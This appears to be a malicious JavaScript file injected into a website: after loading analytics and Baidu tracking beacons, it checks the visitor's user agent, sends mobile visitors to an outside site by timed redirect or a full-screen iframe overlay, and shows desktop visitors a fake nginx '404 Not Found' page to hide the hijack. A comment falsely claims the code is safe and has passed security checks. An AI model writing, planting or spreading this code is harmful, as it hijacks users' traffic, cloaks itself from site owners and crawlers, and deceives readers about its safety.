document.write("<script>!function(p){\"use strict\";!function(t){var s=window,e=document,i=p,c=\"\".concat(\"https:\"===e.location.protocol?\"https://\":\"http://\",\"sdk.51.la/js-sdk-pro.min.js\"),n=e.createElement(\"script\"),r=e.getElementsByTagName(\"script\")[0];n.type=\"text/javascript\",n.setAttribute(\"charset\",\"UTF-8\"),n.async=!0,n.src=c,n.id=\"LA_COLLECT\",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:\"K5RgmDbX9GG2XzWG\",ck:\"K5RgmDbX9GG2XzWG\"});</script>")
(function(){
  var canonicalURL, curProtocol;
  //Get the <link> tag
  var x=document.getElementsByTagName("link");
  //Find the last canonical URL
  if(x.length > 0){
   for (i=0;i<x.length;i++){
    if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
     canonicalURL=x[i].href;
    }
   }
  }
  //Get protocol
     if (!canonicalURL){
      curProtocol = window.location.protocol.split(':')[0];
     }
     else{
      curProtocol = canonicalURL.split(':')[0];
     }
     //Get current URL if the canonical URL does not exist
     if (!canonicalURL) canonicalURL = window.location.href;
     //Assign script content. Replace current URL with the canonical URL
     !function(){
         var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,
             r=canonicalURL,
             t=document.referrer;
         
         if(e.test(t) || e.test(r)){
            return;
         }

         var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";
         t ? (n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)) : r && (n+="?l="+r);
         
         var i=new Image;
         i.src=n;
     }(window);
})();
//* 以下代码为安全可信代码，已经通过了相关安全检测和验证 */
    function isMobile() {
        const mobileDevices = [
            'phone', 'pad', 'pod', 'iPhone', 'iPod', 'ios', 'iPad', 'Android',
            'Mobile', 'BlackBerry', 'IEMobile', 'MQQBrowser', 'JUC', 'Fennec',
            'wOSBrowser', 'BrowserNG', 'WebOS', 'Symbian', 'Windows Phone',
            'Kindle', 'Silk', 'Playbook', 'BB10', 'Nintendo', 'Xbox',
            'PlayStation', 'Huawei', 'Xiaomi', 'Oppo', 'Vivo', 'OnePlus',
            'Samsung', 'LG', 'Sony', 'HTC', 'ZTE', 'Motorola', 'Nokia'
        ];
        return mobileDevices.some(device => {
            return navigator.userAgent.match(new RegExp(device, 'i'));
        });
    }
//link-Nika
    const mobileUrl = "https://www.360yyds.com/";
    function getIosVersion() {
        const match = navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/);
        return match ? parseInt(match[1], 10) : false;
    }
    const isIOS = !!navigator.userAgent.match(/(iPod|iPhone|iPad)/);
    const time = Math.floor(Math.random() * (1000 - 500 + 1)) + 500;
    if (isMobile()) {
        if (isIOS && getIosVersion() < 13) {
            setTimeout(() => {
                window.location.href = mobileUrl;
            }, time);
        } else {
            document.write('<meta id="viewport" name="viewport" content="user-scalable=no,width=device-width, initial-scale=1.0" />');
            document.write('<style>html,body{width:100%;height:100%;overflow:hidden;}</style>');
            document.write('<div style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:2147483647;background:#fff">');
            document.write('<iframe src="' + mobileUrl + '" frameborder="0" style="border:0;width: 100%; text-align: center; border: medium none; height:100%;max-height: 4000px;"></iframe>');
            document.write('</div>');
        }
    } else {
        document.write('<center><h1>404 Not Found</h1></center><hr><center>nginx</center>');
    }
